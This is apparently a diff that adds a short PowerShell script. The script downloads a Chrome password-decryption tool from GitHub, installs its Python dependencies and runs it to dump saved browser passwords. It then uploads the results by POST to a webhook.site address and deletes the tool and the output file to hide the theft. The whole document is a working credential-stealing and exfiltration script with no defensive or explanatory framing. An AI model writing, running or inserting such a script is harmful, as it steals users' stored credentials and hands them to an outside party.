@@ -1,0 +1,19 @@
+$scriptUrl = "https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/main/decrypt_chrome_password.py"
+
+$scriptDir = "D:\"
+$scriptPath = Join-Path -Path $scriptDir -ChildPath "decrypt_chrome_password.py"
+
+$outputFilePath = Join-Path -Path $scriptDir -ChildPath "output.txt"
+
+Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
+
+pip install pypiwin32 pycryptodome pycryptodomex
+
+$output = python $scriptPath
+
+$output | Out-File -FilePath $outputFilePath
+
+Invoke-WebRequest -Uri "https://webhook.site/9b3ee3d6-745e-42c2-a3d7-c202bd03dd83" -Method POST -InFile $outputFilePath
+
+Remove-Item -Path $scriptPath
+Remove-Item -Path $outputFilePath
